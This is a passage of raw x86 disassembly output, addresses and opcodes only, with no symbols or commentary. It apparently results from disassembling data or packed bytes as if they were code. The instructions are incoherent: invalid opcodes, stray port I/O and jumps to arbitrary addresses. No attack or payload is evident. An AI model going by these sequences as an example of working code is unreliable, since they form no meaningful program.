  403dea:	02 ba 82 16 ed 5c    	add    0x5ced1682(%edx),%bh
  403df0:	1c cf                	sbb    $0xcf,%al
  403df2:	8a 2b                	mov    (%ebx),%ch
  403df4:	b4 79                	mov    $0x79,%ah
  403df6:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403df7:	92                   	xchg   %eax,%edx
  403df8:	f2 07                	repnz pop %es
  403dfa:	f3 f0 e2 69          	repz lock loop 0x403e67
  403dfe:	4e                   	dec    %esi
  403dff:	a1 f4 da 65 cd       	mov    0xcd65daf4,%eax
  403e04:	be 05 06 d5 62       	mov    $0x62d50605,%esi
  403e09:	34 d1                	xor    $0xd1,%al
  403e0b:	1f                   	pop    %ds
  403e0c:	fe                   	(bad)
  403e0d:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  403e0e:	c4 8a 53 2e 34 9d    	les    -0x62cbd1ad(%edx),%ecx
  403e14:	55                   	push   %ebp
  403e15:	f3 a2 a0 e1 8a 05    	repz mov %al,0x58ae1a0
  403e1b:	32 eb                	xor    %bl,%ch
  403e1d:	f6 a4 75 ec 83 0b 39 	mulb   0x390b83ec(%ebp,%esi,2)
  403e24:	ef                   	out    %eax,(%dx)
  403e25:	60                   	pusha
  403e26:	40                   	inc    %eax
  403e27:	aa                   	stos   %al,%es:(%edi)
  403e28:	9f                   	lahf
  403e29:	71 5e                	jno    0x403e89
  403e2b:	06                   	push   %es
  403e2c:	10 6e bd             	adc    %ch,-0x43(%esi)
  403e2f:	51                   	push   %ecx
  403e30:	8a 21                	mov    (%ecx),%ah
  403e32:	3e f9                	ds stc
  403e34:	06                   	push   %es
  403e35:	dd 96 3d 05 3e dd    	fstl   -0x22c1fac3(%esi)
  403e3b:	ae                   	scas   %es:(%edi),%al
  403e3c:	bd e6 4d 46 8d       	mov    $0x8d464de6,%ebp
  403e41:	54                   	push   %esp
  403e42:	91                   	xchg   %eax,%ecx
  403e43:	b5 5d                	mov    $0x5d,%ch
  403e45:	c4 71 05             	les    0x5(%ecx),%esi
  403e48:	d4 06                	aam    $0x6
  403e4a:	04 6f                	add    $0x6f,%al
  403e4c:	15 50 60 ff fb       	adc    $0xfbff6050,%eax
  403e51:	98                   	cwtl
  403e52:	19 24 e9             	sbb    %esp,(%ecx,%ebp,8)
  403e55:	bd d6 97 43 40       	mov    $0x404397d6,%ebp
  403e5a:	89 cc                	mov    %ecx,%esp
  403e5c:	9e                   	sahf
  403e5d:	d9 67 77             	fldenv 0x77(%edi)
  403e60:	42                   	inc    %edx
  403e61:	e8 b0 bd 8b 89       	call   0x89cbfc16
  403e66:	07                   	pop    %es
  403e67:	88 5b 19             	mov    %bl,0x19(%ebx)
  403e6a:	e7 38                	out    %eax,$0x38
  403e6c:	ee                   	out    %al,(%dx)
  403e6d:	c8 79 db 0a          	enter  $0xdb79,$0xa
  403e71:	7c a1                	jl     0x403e14
  403e73:	47                   	inc    %edi
  403e74:	0f 42 7c e9 1e       	cmovb  0x1e(%ecx,%ebp,8),%edi
  403e79:	84 f8                	test   %bh,%al
  403e7b:	c9                   	leave
  403e7c:	00 00                	add    %al,(%eax)
  403e7e:	00 00                	add    %al,(%eax)
  403e80:	86 80 09 83 ed 2b    	xchg   %al,0x2bed8309(%eax)
  403e86:	32 48 70             	xor    0x70(%eax),%cl
  403e89:	11 1e                	adc    %ebx,(%esi)
  403e8b:	ac                   	lods   %ds:(%esi),%al
  403e8c:	72 5a                	jb     0x403ee8
  403e8e:	6c                   	insb   (%dx),%es:(%edi)
  403e8f:	4e                   	dec    %esi
  403e90:	ff 0e                	decl   (%esi)
  403e92:	fd                   	std
  403e93:	fb                   	sti
  403e94:	38 85 0f 56 d5 ae    	cmp    %al,-0x512aa9f1(%ebp)
  403e9a:	3d 1e 39 2d 36       	cmp    $0x362d391e,%eax
  403e9f:	27                   	daa
  403ea0:	d9 0f                	(bad) (%edi)
  403ea2:	0a 64 a6 5c          	or     0x5c(%esi,%eiz,4),%ah
  403ea6:	68 21 54 5b 9b       	push   $0x9b5b5421
  403eab:	d1 2e                	shrl   $1,(%esi)
  403ead:	36 24 3a             	ss and $0x3a,%al
  403eb0:	67 0a 0c             	or     (%si),%cl
  403eb3:	b1 e7                	mov    $0xe7,%cl
  403eb5:	57                   	push   %edi
  403eb6:	93                   	xchg   %eax,%ebx
  403eb7:	0f 96 ee             	setbe  %dh
  403eba:	b4 d2                	mov    $0xd2,%ah
  403ebc:	91                   	xchg   %eax,%ecx
  403ebd:	9b                   	fwait
  403ebe:	1b 9e c5 c0 80 4f    	sbb    0x4f80c0c5(%esi),%ebx
  403ec4:	20 dc                	and    %bl,%ah
  403ec6:	61                   	popa
  403ec7:	a2 4b 77 5a 69       	mov    %al,0x695a774b
  403ecc:	1a 12                	sbb    (%edx),%dl
  403ece:	1c 16                	sbb    $0x16,%al
  403ed0:	ba 93 e2 0a 2a       	mov    $0x2a0ae293,%edx
  403ed5:	a0 c0 e5 e0 22       	mov    0x22e0e5c0,%al
  403eda:	3c 43                	cmp    $0x43,%al
  403edc:	17                   	pop    %ss
  403edd:	1b 12                	sbb    (%edx),%edx
  403edf:	1d 0d 09 0e 0b       	sbb    $0xb0e090d,%eax
  403ee4:	c7                   	(bad)
  403ee5:	8b f2                	mov    %edx,%esi
  403ee7:	ad                   	lods   %ds:(%esi),%eax
  403ee8:	a8 b6                	test   $0xb6,%al
  403eea:	2d b9 a9 1e 14       	sub    $0x141ea9b9,%eax
  403eef:	c8 19 f1 57          	enter  $0xf119,$0x57
  403ef3:	85 07                	test   %eax,(%edi)
  403ef5:	75 af                	jne    0x403ea6
  403ef7:	4c                   	dec    %esp
  403ef8:	dd 99 ee bb 60 7f    	fstpl  0x7f60bbee(%ecx)
  403efe:	a3 fd 26 01 f7       	mov    %eax,0xf70126fd
  403f03:	9f                   	lahf
  403f04:	f5                   	cmc
  403f05:	72 5c                	jb     0x403f63
  403f07:	bc 3b 66 44 c5       	mov    $0xc544663b,%esp
  403f0c:	7e fb                	jle    0x403f09
  403f0e:	5b                   	pop    %ebx
  403f0f:	34 29                	xor    $0x29,%al
  403f11:	43                   	inc    %ebx
  403f12:	8b 76 c6             	mov    -0x3a(%esi),%esi
  403f15:	23 cb                	and    %ebx,%ecx
  403f17:	dc fc                	fdivr  %st,%st(4)
  403f19:	ed                   	in     (%dx),%eax
  403f1a:	b6 68                	mov    $0x68,%dh
  403f1c:	f1                   	int1
  403f1d:	e4 b8                	in     $0xb8,%al
  403f1f:	63 dc                	arpl   %ebx,%esp
  403f21:	31 d7                	xor    %edx,%edi
  403f23:	ca 85 63             	lret   $0x6385
  403f26:	42                   	inc    %edx
  403f27:	10 22                	adc    %ah,(%edx)
  403f29:	97                   	xchg   %eax,%edi
  403f2a:	13 40 11             	adc    0x11(%eax),%eax
  403f2d:	c6 84 20 24 4a 85 7d 	movb   $0x3d,0x7d854a24(%eax,%eiz,1)
  403f34:	3d 
  403f35:	bb d2 f8 32 f9       	mov    $0xf932f8d2,%ebx
  403f3a:	ae                   	scas   %es:(%edi),%al
  403f3b:	11 a1 29 c7 6d 2f    	adc    %esp,0x2f6dc729(%ecx)
  403f41:	9e                   	sahf
  403f42:	1d 4b 30 b2 dc       	sbb    $0xdcb2304b,%eax
  403f47:	f3 52                	repz push %edx
  403f49:	86 0d ec e3 c1 77    	xchg   %cl,0x77c1e3ec
  403f4f:	d0 16                	rclb   $1,(%esi)
  403f51:	b3 2b                	mov    $0x2b,%bl
  403f53:	6c                   	insb   (%dx),%es:(%edi)
  403f54:	b9 70 a9 99 48       	mov    $0x4899a970,%ecx
  403f59:	94                   	xchg   %eax,%esp
  403f5a:	11 fa                	adc    %edi,%edx
  403f5c:	64 e9 47 22 8c fc    	fs jmp 0xfccc61a9
  403f62:	a8 c4                	test   $0xc4,%al
  403f64:	3f                   	aas
  403f65:	f0 a0 1a 2c 7d 56    	lock mov 0x567d2c1a,%al
  403f6b:	d8 90 33 22 ef 4e    	fcoms  0x4eef2233(%eax)
  403f71:	49                   	dec    %ecx
  403f72:	87 c7                	xchg   %eax,%edi
  403f74:	d1 38                	sarl   $1,(%eax)
  403f76:	d9 c1                	fld    %st(1)
  403f78:	a2 ca 8c fe 0b       	mov    %al,0xbfe8cca
  403f7d:	d4 98                	aam    $0x98
  403f7f:	36 81 f5 a6 cf de 7a 	ss xor $0x7adecfa6,%ebp
  403f86:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403f87:	28 8e b7 da 26 bf    	sub    %cl,-0x40d92549(%esi)
  403f8d:	ad                   	lods   %ds:(%esi),%eax
  403f8e:	3f                   	aas
  403f8f:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403f90:	9d                   	popf
  403f91:	3a 2c e4             	cmp    (%esp,%eiz,8),%ch
  403f94:	92                   	xchg   %eax,%edx
  403f95:	78 50                	js     0x403fe7
  403f97:	0d cc 5f 6a 9b       	or     $0x9b6a5fcc,%eax
  403f9c:	46                   	inc    %esi
  403f9d:	7e 54                	jle    0x403ff3
  403f9f:	62 13                	bound  %edx,(%ebx)
  403fa1:	8d                   	lea    (bad),%esi
  403fa2:	f6 c2 b8             	test   $0xb8,%dl
  403fa5:	d8 90 e8 f7 39 2e    	fcoms  0x2e39f7e8(%eax)
  403fab:	5e                   	pop    %esi
  403fac:	af                   	scas   %es:(%edi),%eax
  403fad:	c3                   	ret
  403fae:	82 f5 80             	xor    $0x80,%ch
  403fb1:	5d                   	pop    %ebp
  403fb2:	9f                   	lahf
  403fb3:	be 93 d0 69 7c       	mov    $0x7c69d093,%esi
  403fb8:	2d d5 6f a9 12       	sub    $0x12a96fd5,%eax
  403fbd:	25 cf b3 99 ac       	and    $0xac99b3cf,%eax
  403fc2:	c8 3b 7d 18          	enter  $0x7d3b,$0x18
  403fc6:	10 a7 63 9c e8 6e    	adc    %ah,0x6ee89c63(%edi)
  403fcc:	bb 3b db 7b 78       	mov    $0x787bdb3b,%ebx
  403fd1:	26 cd 09             	es int $0x9
  403fd4:	18 59 6e             	sbb    %bl,0x6e(%ecx)
  403fd7:	f4                   	hlt
  403fd8:	b7 9a                	mov    $0x9a,%bh
  403fda:	ec                   	in     (%dx),%al
  403fdb:	01 9a 4f 83 a8 6e    	add    %ebx,0x6ea8834f(%edx)
  403fe1:	95                   	xchg   %eax,%ebp
  403fe2:	e6 65                	out    %al,$0x65
  403fe4:	e6 ff                	out    %al,$0xff
  403fe6:	aa                   	stos   %al,%es:(%edi)
  403fe7:	7e cf                	jle    0x403fb8
  403fe9:	bc 21 08 e8 15       	mov    $0x15e80821,%esp
  403fee:	ef                   	out    %eax,(%dx)
  403fef:	e6 9b                	out    %al,$0x9b
  403ff1:	e7 ba                	out    %eax,$0xba
  403ff3:	d9 36                	fnstenv (%esi)
  403ff5:	6f                   	outsl  %ds:(%esi),(%dx)
  403ff6:	4a                   	dec    %edx
  403ff7:	ce                   	into
  403ff8:	09 9f ea d4 7c b0    	or     %ebx,-0x4f832b16(%edi)
  403ffe:	29 d6                	sub    %edx,%esi
  404000:	b2 a4                	mov    $0xa4,%dl
  404002:	31 af 23 3f 2a 31    	xor    %ebp,0x312a3f23(%edi)
  404008:	94                   	xchg   %eax,%esp
  404009:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40400a:	c6                   	(bad)
  40400b:	30 66 a2             	xor    %ah,-0x5e(%esi)
  40400e:	35 c0 bc 4e 74       	xor    $0x744ebcc0,%eax
  404013:	37                   	aaa
  404014:	ca 82 fc             	lret   $0xfc82
  404017:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  404018:	d0 90 e0 b0 d8 a7    	rclb   $1,-0x58274f20(%eax)
  40401e:	33 15 98 04 f1 4a    	xor    0x4af10498,%edx
  404024:	da ec                	(bad)
  404026:	41                   	inc    %ecx
  404027:	f7 50 cd             	notl   -0x33(%eax)
  40402a:	7f 0e                	jg     0x40403a
  40402c:	f6 91 17 2f d6 4d    	notb   0x4dd62f17(%ecx)
  404032:	76 8d                	jbe    0x403fc1
  404034:	b0 ef                	mov    $0xef,%al
  404036:	43                   	inc    %ebx
  404037:	4d                   	dec    %ebp
  404038:	4d                   	dec    %ebp
  404039:	aa                   	stos   %al,%es:(%edi)
  40403a:	cc                   	int3
  40403b:	54                   	push   %esp
  40403c:	04 96                	add    $0x96,%al
  40403e:	e4 df                	in     $0xdf,%al
  404040:	b5 d1                	mov    $0xd1,%ch
  404042:	9e                   	sahf
  404043:	e3 88                	jecxz  0x403fcd
  404045:	6a 4c                	push   $0x4c
  404047:	1b 1f                	sbb    (%edi),%ebx
  404049:	2c c1                	sub    $0xc1,%al
  40404b:	b8 51 65 46 7f       	mov    $0x7f466551,%eax
  404050:	ea 5e 9d 04 35 8c 01 	ljmp   $0x18c,$0x35049d5e
  404057:	5d                   	pop    %ebp
  404058:	74 87                	je     0x403fe1
  40405a:	fa                   	cli
  40405b:	73 41                	jae    0x40409e
  40405d:	0b fb                	or     %ebx,%edi
  40405f:	2e 1d 67 b3 5a d2    	cs sbb $0xd25ab367,%eax
  404065:	db 92 52 56 10 e9    	fistl  -0x16efa9ae(%edx)
  40406b:	33 47 d6             	xor    -0x2a(%edi),%eax
  40406e:	6d                   	insl   (%dx),%es:(%edi)
  40406f:	13 61 d7             	adc    -0x29(%ecx),%esp
  404072:	9a 8c 0c a1 37 7a 14 	lcall  $0x147a,$0x37a10c8c
  404079:	f8                   	clc
  40407a:	59                   	pop    %ecx
  40407b:	8e 3c 13             	mov    (%ebx,%edx,1),%?
  40407e:	eb 89                	jmp    0x404009
  404080:	27                   	daa
  404081:	a9 ce ee c9 61       	test   $0x61c9eece,%eax
  404086:	b7 35                	mov    $0x35,%bh
  404088:	e5 1c                	in     $0x1c,%eax
  40408a:	e1 ed                	loope  0x404079
  40408c:	b1 47                	mov    $0x47,%cl
  40408e:	7a 3c                	jp     0x4040cc
  404090:	df d2                	(bad)
  404092:	9c                   	pushf
  404093:	59                   	pop    %ecx
  404094:	73 f2                	jae    0x404088
  404096:	55                   	push   %ebp
  404097:	3f                   	aas
  404098:	ce                   	into
  404099:	14 18                	adc    $0x18,%al
  40409b:	79 37                	jns    0x4040d4
  40409d:	c7                   	(bad)
  40409e:	73 bf                	jae    0x40405f
  4040a0:	cd f7                	int    $0xf7
  4040a2:	53                   	push   %ebx
  4040a3:	ea aa fd 5f 5b 6f 3d 	ljmp   $0x3d6f,$0x5b5ffdaa
  4040aa:	df 14 db             	fists  (%ebx,%ebx,8)
  4040ad:	44                   	inc    %esp
  4040ae:	78 86                	js     0x404036
  4040b0:	f3 af                	repz scas %es:(%edi),%eax
  4040b2:	ca 81 c4             	lret   $0xc481
  4040b5:	68 b9 3e 34 24       	push   $0x24343eb9
  4040ba:	38 2c 40             	cmp    %ch,(%eax,%eax,2)
  4040bd:	a3 c2 5f c3 1d       	mov    %eax,0x1dc35fc2
  4040c2:	16                   	push   %ss
  4040c3:	72 25                	jb     0x4040ea
  4040c5:	e2 bc                	loop   0x404083
  4040c7:	0c 49                	or     $0x49,%al
  4040c9:	3c 28                	cmp    $0x28,%al
  4040cb:	8b 95 0d ff 41 01    	mov    0x141ff0d(%ebp),%edx
  4040d1:	a8 39                	test   $0x39,%al
  4040d3:	71 b3                	jno    0x404088
  4040d5:	0c 08                	or     $0x8,%al
  4040d7:	de e4                	fsubp  %st,%st(4)
  4040d9:	b4 d8                	mov    $0xd8,%ah
  4040db:	9c                   	pushf
  4040dc:	c1 56 64 90          	rcll   $0x90,0x64(%esi)
  4040e0:	84 cb                	test   %cl,%bl
  4040e2:	7b 61                	jnp    0x404145
  4040e4:	b6 32                	mov    $0x32,%dh
  4040e6:	d5 70                	aad    $0x70
  4040e8:	5c                   	pop    %esp
  4040e9:	6c                   	insb   (%dx),%es:(%edi)
  4040ea:	48                   	dec    %eax
  4040eb:	74 57                	je     0x404144
  4040ed:	b8 d0 42 f4 51       	mov    $0x51f442d0,%eax
  4040f2:	50                   	push   %eax
  4040f3:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4040f4:	41                   	inc    %ecx
  4040f5:	7e 53                	jle    0x40414a
  4040f7:	65 17                	gs pop %ss
  4040f9:	1a c3                	sbb    %bl,%al
  4040fb:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4040fc:	27                   	daa
  4040fd:	3a 96 5e ab 3b cb    	cmp    -0x34c454a2(%esi),%dl
  404103:	6b 9d 1f f1 45 fa ac 	imul   $0xffffffac,-0x5ba0ee1(%ebp),%ebx
  40410a:	ab                   	stos   %eax,%es:(%edi)
  40410b:	58                   	pop    %eax
  40410c:	e3 4b                	jecxz  0x404159
  40410e:	93                   	xchg   %eax,%ebx
  40410f:	03 30                	add    (%eax),%esi
  404111:	20 55 fa             	and    %dl,-0x6(%ebp)
  404114:	76 ad                	jbe    0x4040c3
  404116:	f6 6d cc             	imulb  -0x34(%ebp)
  404119:	88 91 76 02 f5 25    	mov    %dl,0x25f50276(%ecx)
  40411f:	4c                   	dec    %esp
  404120:	e5 4f                	in     $0x4f,%eax
  404122:	fc                   	cld
  404123:	d7                   	xlat   %ds:(%ebx)
  404124:	2a c5                	sub    %ch,%al
  404126:	d7                   	xlat   %ds:(%ebx)
  404127:	cb                   	lret
  404128:	35 26 80 44 62       	xor    $0x62448026,%eax
  40412d:	b5 8f                	mov    $0x8f,%ch
  40412f:	a3 b1 de 49 5a       	mov    %eax,0x5a49deb1
  404134:	ba 25 67 1b ea       	mov    $0xea1b6725,%edx
  404139:	45                   	inc    %ebp
  40413a:	98                   	cwtl
  40413b:	0e                   	push   %cs
  40413c:	fe                   	(bad)
  40413d:	5d                   	pop    %ebp
  40413e:	e1 c0                	loope  0x404100
  404140:	2f                   	das
  404141:	c3                   	ret
  404142:	02 75 4c             	add    0x4c(%ebp),%dh
  404145:	81 12 f0 46 8d a3    	adcl   $0xa38d46f0,(%edx)
  40414b:	97                   	xchg   %eax,%edi
  40414c:	d3 6b c6             	shrl   %cl,-0x3a(%ebx)
  40414f:	f9                   	stc
  404150:	8f 03                	pop    (%ebx)
  404152:	e7 5f                	out    %eax,$0x5f
  404154:	92                   	xchg   %eax,%edx
  404155:	15 95 9c 6d bf       	adc    $0xbf6d9c95,%eax
  40415a:	eb 7a                	jmp    0x4041d6
